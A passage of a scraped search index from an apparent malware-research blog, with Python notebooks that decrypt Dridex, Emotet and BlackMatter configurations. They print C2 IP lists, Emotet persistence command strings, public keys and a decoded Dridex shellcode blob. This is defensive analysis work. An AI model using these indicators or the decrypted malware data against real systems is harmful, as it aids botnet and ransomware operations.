x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . ROOT CIMV2 SELECT * FROM Win32_Fan *.dll *.exe ntdll.dll . data = unhex(&#39;95c985f019ba926e4c776a4f39bb87c3af575e04263a3cfbf446fe76cd45826bdfc9c381775b910daa5af895189ac2037f94d7e0cbcb9f04a44b3dade44673637e63d0aeb931ee404dee9737afe9df5fefac345edde26397a125a483bbf9e4a80012c314d14eab1fe2a997e969b313ef290f7700bd7f3a3afb3f8a493f1449ff72a2e5163c632c7a79d450e1f8618cfaa15cba132da34e83c5dfe1aecf4b016b10e489041d096388fb2ada047bc1567732fe4b2c7d7b249be25e74ee1a6ee47abda1b8efd31253186df54c518aa596c5351fbe1cd148ef4bab2645&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . S:(ML;;NW;;;LW)D:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0) Sessions %d BaseNamedObjects . data = unhex(&#39;763204228337e0fd87cd26f15d317e7753125863474a2a23cb087289562e629b87de7aebca904d887233a895007c1b7c8b01fc71443ef6ffb96a7a857d8b636bd5a0d3&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . GET POST . data = unhex(&#39;9929d0667cd2bee6ce087b584cfa8d54a813828fe28e53422b76d901b32b276fd6bf3583d4c0078646c3f7e0d908c93f798c881c00a9f7b23498892e6dea7634eaa2b1c7e6c67b34f153c9de05b775602a824dc48d52a7175c86e0112db594a53b7fd4c79689ce1adbd8b8fada3a0c03b8b980fe72f8af41ed8ed3af9a544cdf15c7e3ed8e878f61eaa41b626b5d450e65fd78b8736da4aeb1504d65352e081c877863842ab6adae783a99d525cdeb0eb078f8ee748283ce9554b88e9053b63f4c79e4479f117a341f97d7de18f4276b73ec5db445db5865bb16c8f2d819103d436c1b208cf00ee656e799559082d0996e8d89a07202915cb38ea1f3ad813b08034385703110dba092baf240fb0b8d839a07befcb05830c4a8ee25206c9539c010732a75670c8cba4db4eb8996d7d6f3012971574c3da3fb4a0e5274256ccbe3ee349e1fe5ab7249c78505cee79aa943beca99bdfb52f9aaae4d29ca9b3f26db612a1d866a2162ab96a07ad4a69544b1573c2d6e2c7d0424c97aaa23fbff7b703d4ff88d24dda7&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . Program Manager Progman AdvApi32~PsApi~shlwapi~shell32~WinInet /run /tn &#34;%ws&#34; &#34;%ws&#34; /grant:r &#34;%ws&#34;:F NTUSER.DAT winsxs x86_* amd64_* *.exe Sessions %d BaseNamedObjects . data = unhex(&#39;0921161a62f46e068fcb7050fe9d5fb793d2666a91610f5c75813f2e6a7f6846478262fcb0bd4e0e5ecdb8763266b6dba380102939f258b4e4c6e3c31481976ae308b958793d404c3dfa35a79ac4551495846111e06c4f0e5c4f9dbcf4d26fd2c9d1130852a1bd812f97d6b9b92fb919866f0a1ab95167a0d111c8b214ed78f7a0aaa18dae2ee00fb34974eb3bbc3b778c3f88f4b29dc7d1efd1793d79fa4381e2d991e0115ffc398989f531053028cddcdec0151fa888d249030604224cae2dc1fc6fcb792c4a9943e12ed6c825a69342d275fe8f3652f8f3a79d355f461a67cd3b8b4700236b6d63683e638c5c83c80d0bac05eb7f40298f97e43f4f32af9d125643ebe245a5f65a181d70bcb147f63bcf24552e782565a7dd818a4439471ff4092097aeee12453c802332346c07e80a9b31d631428f299d11b6cdd962654eb918ef68f8e6b786f3c7fc4b473e74cc2721d4a292c1f8ab99e0b5968eb6d3452f1b9a1d12a6a2255281e44f56b7b0b87b30001b19958e6681d5272c560396580c87370eadf68ae1c1022fcb05c781bcf09635b2bd648aa6fa100320c79c6a8f86a7a2bc679dad4a31faa6358b061ca98259ad6497afb43a2a98a5d1a1061c8ada7c4710c32fb7742d68bfb6e0d52f3f56cc9519e75df72c377728c2bfc58aa75bad3b136c2ba610d23c02febad47f1394db071774fa9d058ebd512bc4a411466d2a6582a651a7443cc8a3ae106af4433099f5616d3414c09788359272ac4599c76b8686eeb26ad090de576a3345cf30ad95b8053233ecff47c4315e7d30cd41387e44b241d992625dfd4cf7b0f506797a89e85914d7593cc59e2e089fbbac5a56b96824af9773822e35b948616ff348d1545933b3eb8253c59d29ebfd4001d087a457ff4b49a6eb2b4a9a2d13b1dd3c4d29db90c3ddf4434fa81246f850b719cea0450c30438cf7ca272681a0a6a76ecb6fe7b460f6703f0e3ed0ffe9c43db993e3c07a97405ea42caba91c47070dd9080e32fcd678721a032956bb393c24714c88&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) print(b64_data) out = base64.b64decode(b64_data) print(out) SHELLCODE_FILE = &#39;/tmp/dridex_shell_2.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . b&#39;o6ijqKOoo6ijqKOoo6ijqKqqqqqqqqqqrKqyqp+fn5+1o6Okqqq6qpaqqKrDw5aWt67WvaPFo6Ofw5yqqqyqvwN/EX8BfwE/AQGQgn2XWVlZWVl/WVlgfX9/WVlZWVlZWVlZWVlZmoh9WVBQUFBZWVlZYZRhnllZhVmSo2BgWVlZWVlZWVlZWVmfAQMBBAPVA8wBvAPwEBAQEFBQUFAUICAgIAEBAQHEAhAAAAAAAQHAwhARAgMRAwMEAAAUAAIAAMbIAgICAgAA/////wAAAP/KAQEBAAYABADAwgEBAwH//wEAA8TExgMBAQH/AwMDyEAACgAEAAAAAH8AMwEAAAAAAAD/v///AAAAAAcAAP8AAAAAAAAAAAAAAAAAAP//AAAAvwAAAAAAAAAAfwAA/0pKSkpLUkpKSkpPTEpKSkpKSkpKVUVASkpKRVlNRkpdSkpKSkpKSkpKSkpKSkphY2dOSkprbUpKRW1KSkRFSkoAAAACDQYGBgYOAAAAAAYGBgAGBgIGAAoKBwcGAgUFAgIAAAQEBAQAAAAOBQYGBgEGAAAIABAAGAAgACgAMACAAYIBhgD2z/4/qwCwALEAswC6+LsAwADBAMe/Yv8Ajf8AxP8Axf8A///rAf8OEggAEwkAFggAFwkAKwkArv8Hsv8AtP8Atf8AwwEAx/+/5wgA8AIA x00 x00&#39; b&#39; xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xaa xaa xaa xaa xaa xaa xaa xaa xac xaa xb2 xaa x9f x9f x9f x9f xb5 xa3 xa3 xa4 xaa xaa xba xaa x96 xaa xa8 xaa xc3 xc3 x96 x96 xb7 xae xd6 xbd xa3 xc5 xa3 xa3 x9f xc3 x9c xaa xaa xac xaa xbf x03 x7f x11 x7f x01 x7f x01? x01 x01 x90 x82} x97YYYYY x7fYY`} x7f x7fYYYYYYYYYYYY x9a x88}YPPPPYYYYa x94a x9eYY x85Y x92 xa3``YYYYYYYYYYY x9f x01 x03 x01 x04 x03 xd5 x03 xcc x01 xbc x03 xf0 x10 x10 x10 x10PPPP x14 x01 x01 x01 x01 xc4 x02 x10 x00 x00 x00 x00 x01 x01 xc0 xc2 x10 x11 x02 x03 x11 x03 x03 x04 x00 x00 x14 x00 x02 x00 x00 xc6 xc8 x02 x02 x02 x02 x00 x00 xff xff xff xff x00 x00 x00 xff xca x01 x01 x01 x00 x06 x00 x04 x00 xc0 xc2 x01 x01 x03 x01 xff xff x01 x00 x03 xc4 xc4 xc6 x03 x01 x01 x01 xff x03 x03 x03 xc8@ x00 n x00 x04 x00 x00 x00 x00 x7f x003 x01 x00 x00 x00 x00 x00 x00 xff xbf xff xff x00 x00 x00 x00 x07 x00 x00 xff x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff x00 x00 x00 xbf x00 x00 x00 x00 x00 x00 x00 x00 x7f x00 x00 xffJJJJKRJJJJOLJJJJJJJJUE@JJJEYMFJ]JJJJJJJJJJJJJJacgNJJkmJJEmJJDEJJ x00 x00 x00 x02 r x06 x06 x06 x06 x0e x00 x00 x00 x00 x06 x06 x06 x00 x06 x06 x02 x06 x00 n n x07 x07 x06 x02 x05 x05 x02 x02 x00 x00 x04 x04 x04 x04 x00 x00 x00 x0e x05 x06 x06 x06 x01 x06 x00 x00 x08 x00 x10 x00 x18 x00 x00( x000 x00 x80 x01 x82 x01 x86 x00 xf6 xcf xfe? xab x00 xb0 x00 xb1 x00 xb3 x00 xba xf8 xbb x00 xc0 x00 xc1 x00 xc7 xbfb xff x00 x8d xff x00 xc4 xff x00 xc5 xff x00 xff xff xeb x01 xff x0e x12 x08 x00 x13 t x00 x16 x08 x00 x17 t x00+ t x00 xae xff x07 xb2 xff x00 xb4 xff x00 xb5 xff x00 xc3 x01 x00 xc7 xff xbf xe7 x08 x00 xf0 x02 x00&#39; . 516 . C2 Networking . print(&quot;%d.%d.%d.%d&quot; % (0x67, 0x2a, 0x38, 0x0f)) . 103.42.56.15 . import re import pefile import struct # Change to be your own local file path SAMPLE_FILE_PATH = &#39;/tmp/dridex.bin&#39; file_data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() ip_parse_egg = rb&#39; xbb(....) x89 x45 x00 x0f xb7 x53 x04 x89 x10 x0f xb6 x4b x0b x83 xf9 x0a&#39; pe = pefile.PE(data=file_data) data_section = None for s in pe.sections: if s.Name == b&#39;.data x00 x00 x00&#39;: data_section = s.get_data() match = re.search(ip_parse_egg, file_data, re.DOTALL|re.MULTILINE) ip_table_addr = None if match: table_addr = struct.unpack(&#39;&lt;I&#39;,match.group(1))[0] print(&quot;Found data table at: %s n&quot; % hex(table_addr)) # Turn address into rva/offset and calculate table offsets table_offset = pe.get_offset_from_rva(table_addr - pe.OPTIONAL_HEADER.ImageBase) ip_table_offset = table_offset + 0xb version_table_offset = table_offset + 4 # Get bot version bot_version = struct.unpack(&#39;&lt;H&#39;, file_data[version_table_offset:version_table_offset+2])[0] print(&quot;Bot Version: %d n&quot; % bot_version) ip_table_len = ord(file_data[ip_table_offset:ip_table_offset+1]) print(&quot;IP table length: %d&quot; % ip_table_len) # Move to actual IP table start ip_table_offset += 1 # Extract the c2 ips c2_ips = [] for i in range(ip_table_len): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(file_data[ip_table_offset:ip_table_offset+1]), ord(file_data[ip_table_offset+1:ip_table_offset+2]), ord(file_data[ip_table_offset+2:ip_table_offset+3]), ord(file_data[ip_table_offset+3:ip_table_offset+4])) port_string = struct.unpack(&#39;&lt;H&#39;, file_data[ip_table_offset+4:ip_table_offset+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) c2_ips.append(&quot;%s:%s&quot; % (ip_string,port_string)) ip_table_offset += 6 . Found data table at: 0x55d020 Bot Version: 22201 IP table length: 3 103.42.56.15:443 169.255.57.61:8116 128.199.192.135:6602 .",
            "url": "https://research.openanalysis.net/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "relUrl": "/dridex/doppeldridex/malware/config/2021/11/30/dridex_loader.html",
            "date": " • Nov 30, 2021"
        }
        
    
  
    
        ,"post28": {
            "title": "Emotet Config Extractor",
            "content": "Overview . Sample: c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 . Unpacked: eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . References: . Malshare Sample (Unpacked) | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Load The Sample . import struct import pefile EMOTET_FILE = r&#39;/tmp/emotet3.bin&#39; data = open(EMOTET_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) . txt_data = None for s in pe.sections: if b&#39;.text&#39; in s.Name: txt_data = s.get_data() print(txt_data[:100]) . b&#39; x03 xf2y x1a x0e xf2y x1aF xb1:JV xb05S@ xb05UA x90 x13 xa3 x91 x9f&amp; xccr xbf xa6 x021 x91H xa5= x96 x07 x00 x00 x00 x00 x00 x00 x00 x00&lt;n xbf x19 n xbf x19q x07 xdckS x1d xd0 x7fHN xefkU x03 xd6mU x18 xda9l x1c xd0oU n xdak,Gd&gt; xc0I xbd x9a x9d&gt;( xc2g xd3 x03 xdb&#39; . Decrypt Strings Table . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(s): return all(c &lt; 128 for c in s) strings_table = [] ECS1_string = None ECK1_string = None for i in range(0,0x1000,4): candidate_1 = struct.unpack(&#39;&lt;I&#39;,txt_data[i:i+4])[0] candidate_2 = struct.unpack(&#39;&lt;I&#39;,txt_data[i+4:i+8])[0] if (candidate_1 &amp; 0xffffff00) ^ (candidate_2 &amp; 0xffffff00) == 0: # We have a match! key = txt_data[i:i+4] data_len = candidate_1 ^ candidate_2 enc_data = txt_data[i+8:i+8+data_len] ptxt_data = xor_decrypt(enc_data, key) if is_ascii(ptxt_data): if ptxt_data != b&#39;&#39;: strings_table.append(ptxt_data.decode(&#39;latin1&#39;)) if b&#39;ECS1&#39; == ptxt_data[:4]: ECS1_string = ptxt_data if b&#39;ECK1&#39; == ptxt_data[:4]: ECK1_string = ptxt_data # Print our strings print(ECS1_string) print(ECK1_string) for s in strings_table: print(s) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECCPUBLICBLOB Microsoft Primitive Provider SHA256 ObjectLength ECDSA_P256 HASH AES ECDH_P256 KeyDataBlob %s %s %s * %s:Zone.Identifier %s %s.exe Cookie: %s=%s --%S-- %u.%u.%u.%u Content-Type: multipart/form-data; boundary=%s --%S Content-Disposition: form-data; name=&#34;%S&#34;; filename=&#34;%S&#34; Content-Type: application/octet-stream %s %s %s rundll32.exe &#34;%s %s&#34;,%s SOFTWARE Microsoft Windows CurrentVersion Run Control_RunDLL %s %s%x %s rundll32.exe &#34;%s %s&#34;,%s %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL POST userenv.dll shell32.dll bcrypt.dll crypt32.dll wtsapi32.dll urlmon.dll shlwapi.dll wininet.dll advapi32.dll %s_%08X %s%s.dll %s%s.exe DllRegisterServer %s regsvr32.exe -s &#34;%s&#34; %s rundll32.exe &#34;%s&#34;,Control_RunDLL %s %s rundll32.exe &#34;%s&#34;,Control_RunDLL WinSta0 Default RNG . Elliptic Curve Keys . References: . https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptimportkeypair | https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_ecckey_blob | https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/shared/bcrypt.h | https://pycryptodome.readthedocs.io/en/latest/src/public_key/ecc.html | . print(ECS1_string) print(ECK1_string) # Extract ECS1 key ECS1_key_len = struct.unpack(&#39;&lt;I&#39;,ECS1_string[4:8])[0] ECS1_x = int.from_bytes(ECS1_string[8:8+ECS1_key_len], &quot;big&quot;) ECS1_y = int.from_bytes(ECS1_string[8+ECS1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECS1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECS1_x, point_y=ECS1_y) print(&quot; nECS1 Key&quot;) print(ECS1_key.export_key(format=&quot;PEM&quot;)) # Extract ECK1 key ECK1_key_len = struct.unpack(&#39;&lt;I&#39;,ECK1_string[4:8])[0] ECK1_x = int.from_bytes(ECK1_string[8:8+ECK1_key_len], &quot;big&quot;) ECK1_y = int.from_bytes(ECK1_string[8+ECK1_key_len:], &quot;big&quot;) from Crypto.PublicKey import ECC ECK1_key = ECC.construct(curve=&quot;p256&quot;, point_x=ECK1_x, point_y=ECK1_y) print(&quot; nECK1 Key&quot;) print(ECK1_key.export_key(format=&quot;PEM&quot;)) . b&#34;ECS1 x00 x00 x00 xf4/ x1a x836 x1a&#39;Q x8c$ xf2 xca xa8 xec x85 xaeRYQuH x94 x06p x02s xaa xe8 x9a xc4({V t x0f xbc x08{ x80!z xa6(~ x96E xb9 xc3 xc3 &amp;t xcf xd8 xbe xa2 x85 x1f~ xa7 xa8- x954&#34; b&#39;ECK1 x00 x00 x00 xd85 x93 xd7c x8bP xc5 xdf xcd xe1i xf9 xb16 x00 x9b x9bT; x166 xa2]D. xb280 xd8G6. xb8 xd2 xf4 x8bj xc8 xd8LzED x1a x06 xfa x8f8 xbe xda xfb x00 x96 x9c x84, xce x1e6 x80$P x96&#39; ECS1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9C8agzYaJ1GMJPLKqOyFrlJZUXVI lAZwAnOq6JrEKHtWCQ+8CHuAIXqmKH6WRbnDw1wmdM/YvqKFH36nqC2VNA== --END PUBLIC KEY-- ECK1 Key --BEGIN PUBLIC KEY-- MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE2DWT12OLUMXfzeFp+bE2AJubVDsW NqJdRC6yODDYRzYuuNL0i2rI2Ex6RUQaBvqPOL7a+wCWnIQszh42gCRQlg== --END PUBLIC KEY-- . C2 Ground Truth . 81.0.236.93:443 . data_data = None for s in pe.sections: if b&#39;.data&#39; in s.Name: data_data = s.get_data() print(data_data[:100]) key = data_data[:4] data_len = struct.unpack(&#39;&lt;I&#39;,data_data[:4])[0] ^ struct.unpack(&#39;&lt;I&#39;,data_data[4:8])[0] enc_data = data_data[8:8+data_len] ptxt_data = xor_decrypt(enc_data, key) print(tohex(ptxt_data)) print(&quot; n== C2 List== &quot;) for i in range(0,len(ptxt_data),8): print(&quot;%d.%d.%d.%d:%d&quot; % (ptxt_data[i+0],ptxt_data[i+1],ptxt_data[i+2],ptxt_data[i+3],struct.unpack(&#39;&gt;H&#39;,ptxt_data[i+4:i+6])[0])) . b&#39;5 x84 xe9? x95 x84 xe9? x066 xd4 x034? xe9&gt; x9dA x1315 xd4 xe9&gt; x18 xcb xc8 x0f* x14 xe9&gt; xf1 xa8 x8b x81* x14 xe9&gt; x84 xcc xb91., xe9&gt; x06V x1b xd5* x14 xe9&gt; x8c x10@5* x14 xe9&gt; xbb x802 x92* x14 xe9&gt;{ xab%o4? xe9&gt;{ xaa xa0B4? xe9&gt; x10 xa8 x1d x8e* x14 xe9&gt; x10 xbf8 xb2&#39; b&#39;33b23d3c01bb0001a8c5fa0e005000012d4f21301f900001c42c62be1f900001b148500e1ba8000133d2f2ea1f900001b994a90a1f9000018e04dbad1f9000014e2fcc5001bb00014e2e497d01bb0001252cf4b11f900001253bd18d1f900001bffc6710005000013626f2b901bb000155d643cb1f9000013625e47a01bb0001cf9451771f900001c34def271f900001422a399501bb0001c39a922301bb0001&#39; == C2 List== 51.178.61.60:443 168.197.250.14:80 45.79.33.48:8080 196.44.98.190:8080 177.72.80.14:7080 51.210.242.234:8080 185.148.169.10:8080 142.4.219.173:8080 78.47.204.80:443 78.46.73.125:443 37.44.244.177:8080 37.59.209.141:8080 191.252.103.16:80 54.38.242.185:443 85.214.67.203:8080 54.37.228.122:443 207.148.81.119:8080 195.77.239.39:8080 66.42.57.149:443 195.154.146.35:443 .",
            "url": "https://research.openanalysis.net/emotet/malware/config/2021/11/18/emotet.html",
            "relUrl": "/emotet/malware/config/2021/11/18/emotet.html",
            "date": " • Nov 18, 2021"
        }
        
    
  
    
        ,"post29": {
            "title": "BlackMatter Ransomware Version 3",
            "content": "Overview . Sample: 9BAE897C19F237C22B6BDC024DF27455E739BE24BED07EF0D409F2DF87EEDA58 . References: . Malshare Sample | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first QWORD of the resource is the seed for an lcg. . Following is a DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter_v3.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() print(&quot;Resource data length: %s&quot; % hex(len(r_data))) # Parse data from resource seed = struct.unpack(&#39;&lt;Q&#39;,r_data[:8])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[8:12])[0] enc_data = r_data[12:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %s&quot; % hex(data_size)) print(&quot;Encrypted data example: %s...&quot; % tohex(enc_data[:20])) . Resource data length: 0xe00 Seed: 0x910fde2951947bbf Size: 0xdbe Encrypted data example: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36&#39;... . Decryption Routine . This PRNG algorithim is injected into memory at runtime -- maybe an attempt to hide the algorithm from statica analysis? Not a very good attempt though.... . __int64 __stdcall sub_B45133(_DWORD *a1, _DWORD *a2) { __int64 v2; // rax v2 = ((__int64 (__stdcall *)(_DWORD, _DWORD, int, int))sub_B450FD)(*a2, a2[1], 0x4C957F2D, 0x5851F42D) + 0x14057B7EF767814F; *(_QWORD *)a2 = v2; return ((__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_B450FD)(*a1, a1[1], v2, HIDWORD(v2)); } . eax = 0x00a5f770 edx = 0x910fde29 . import struct def gen_key(seed, key_length): out = b&#39;&#39; tmp_seed = seed for i in range(key_length): tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF out += struct.pack(&#39;&lt;Q&#39;,(tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF) return out tmp_seed = seed tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) #E2 02 10 B2 F6 64 C5 B1 print(&quot;Real Temp seed: %s n n&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;E2 02 10 B2 F6 64 C5 B1&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # 09 21 30 FB 18 EB 52 6A print(&quot;Real Temp seed 2: %s&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;09 21 30 FB 18 EB 52 6A&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # FC9FF30B7AFBF8B7 tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed 2: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key 2: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) key_data = gen_key(seed, data_size) print(&quot;key: %s&quot; % tohex(key_data[:32])) print(&quot;data: %s&quot; % tohex(enc_data[:32])) # buff[0] ^ lo_al = 9e ^ 4f = d1 # buff[1] ^ lo_dh = 4c ^ 4f = 03 # buff[2] ^ lo_ah = bc ^ 8b = 37 # buff[3] ^ lo_dl = f9 ^ 81 = 78 # buff[4] ^ hi_al = fc ^ 61 = 9d for i in range(0,10,8): print(hex(enc_data[i] ^ key_data[i])) print(hex(enc_data[i+1] ^ key_data[i+5])) print(hex(enc_data[i+2] ^ key_data[i+1])) print(hex(enc_data[i+3] ^ key_data[i+4])) print(hex(enc_data[i+4] ^ key_data[i+2])) print(hex(enc_data[i+5] ^ key_data[i+7])) print(hex(enc_data[i+6] ^ key_data[i+3])) print(hex(enc_data[i+7] ^ key_data[i+6])) print(&quot; n n&quot;) . Test temp seed: 0xb1c564f6b21002e2 Test xor key: 0x7b0d4ff9b7fcbc9e Real Temp seed: 0xb1c564f6b21002e2 Real Temp seed 2: 0x6a52eb18fb302109 Test temp seed 2: 0x6a52eb18fb302109 Test xor key 2: 0xfc9ff30b7afbf8b7 key: b&#39;9ebcfcb7f94f0d7bb7f8fb7a0bf39ffc1cf036c7b11595d9dd871868434d676f&#39; data: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36c6254e94751162b199b5d58b&#39; 0xd1 0x3 0x37 0x78 0x9d 0xcb 0x7e 0x8f 0xa0 0xf1 0xb4 0xc5 0x76 0x62 0x0 0x95 . def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key(seed, data_size) for i in range(0,data_size-8,8): out.append(enc_data[i] ^ key_data[i]) out.append(enc_data[i+1] ^ key_data[i+5]) out.append(enc_data[i+2] ^ key_data[i+1]) out.append(enc_data[i+3] ^ key_data[i+4]) out.append(enc_data[i+4] ^ key_data[i+2]) out.append(enc_data[i+5] ^ key_data[i+7]) out.append(enc_data[i+6] ^ key_data[i+3]) out.append(enc_data[i+7] ^ key_data[i+6]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88iNY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt; x00 x01 x01 x01 x01 x01 x01 x01 x01, x00 x00 x00 xa9 x00 x00 x00 xea x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb x01 x00 x00 xd0 x04 x00 x00] x05 x00 x00 xd6 x05 x00 x00 &#39; x07 x00 x00 